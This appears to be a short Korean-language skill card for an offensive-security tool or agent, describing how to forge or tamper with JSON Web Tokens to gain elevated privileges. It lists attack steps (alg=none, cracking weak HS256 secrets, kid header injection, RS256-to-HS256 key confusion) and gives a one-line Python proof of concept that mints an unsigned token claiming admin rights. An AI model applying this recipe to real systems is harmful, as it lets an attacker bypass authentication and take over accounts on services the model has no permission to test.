---
name: jwt
description: JWT 위·변조로 권한 상승
---
## When
토큰이 `xxx.yyy.zzz` 형태

## Tools
jwt_tool, python

## Procedure
1) 헤더/페이로드 디코드
2) alg=none
3) 약한 HS256 비밀 크랙
4) kid 주입

## PoC
```
python -c "import jwt;print(jwt.encode({'admin':1},'',algorithm='none'))"
```

## Pitfalls
RS256→HS256 혼동공격; 서명 검증 여부 확인
